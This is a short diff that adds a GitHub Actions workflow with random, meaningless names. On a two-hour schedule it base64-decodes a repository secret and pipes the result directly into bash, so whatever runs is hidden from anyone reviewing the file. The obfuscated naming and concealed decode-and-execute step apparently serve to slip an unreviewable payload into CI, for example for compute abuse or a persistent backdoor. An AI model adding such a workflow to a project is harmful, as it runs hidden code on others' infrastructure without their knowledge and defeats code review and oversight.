@@ -1,0 +1,13 @@
+name: YXcSwqymg
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  PhYliba:
+    runs-on: ubuntu-24.04
+    env:
+      HenZLa: ${{ secrets.lbObxnmiwOZ }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.RSnyluhxb }}" | base64 -d | bash
